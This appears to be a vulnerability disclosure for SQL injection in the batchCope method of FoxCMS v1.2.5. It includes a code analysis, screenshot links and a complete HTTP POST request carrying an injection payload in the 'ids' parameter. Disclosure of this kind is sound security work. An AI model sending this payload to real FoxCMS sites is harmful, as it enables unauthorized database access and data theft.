# SQL Injection Vulnerability in FoxCMS

**Version: FoxCMS v1.2.5**

**Google Dork: N/A**

**Date: 05/13/2025**

**Tested on: Windows 11, Apache 2.4, MySQL 8.0, PHP 7.3**

**Software Link: https://gitee.com/qianfox/foxcms**

**Description:** A SQL injection vulnerability exists in the `batchCope` method of the controller located at `app/admin/controller/Article.php`. Due to improper handling of the `ids` parameter, user input is directly embedded into a raw SQL query without validation or parameterization. This allows an authenticated attacker to inject arbitrary SQL statements, potentially leading to unauthorized access, extraction of sensitive data, or full compromise of the underlying database.

**code analysis**

The `batchCope` method retrieves the `ids` parameter from user input and directly concatenates it into a raw SQL query without any validation or parameter binding. This allows an attacker to inject arbitrary SQL code through the `ids` parameter, potentially leading to unauthorized access, data leakage, or modification of database contents.

![image](https://github.com/xiaoyangsec/foxcms_sql_injection/blob/main/image-20250513161945913.png)

**Payload used:**

```
POST /index.php/admin1738/Article/batchCope.html HTTP/1.1
Host: www.foxcms.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 41
Origin: http://www.foxcms.com
Connection: keep-alive
Referer: http://www.foxcms.com/index.php/admin1738/Article/index.html?columnId=28
Cookie: PHPSESSID=94901524f6ef7383bc9d9e2730738a3f
Priority: u=0

ids=1)+or+(select database())='foxcms'--+

```

Example：

![image](https://github.com/xiaoyangsec/foxcms_sql_injection/blob/main/image-20250513161636029.png)

![image](https://github.com/xiaoyangsec/foxcms_sql_injection/blob/main/image-20250513161700879.png)

![image](https://github.com/xiaoyangsec/foxcms_sql_injection/blob/main/image-20250513161802423.png)

![image](https://github.com/user-attachments/assets/3dd27721-6a16-4c1b-824b-ca91f01184c1)

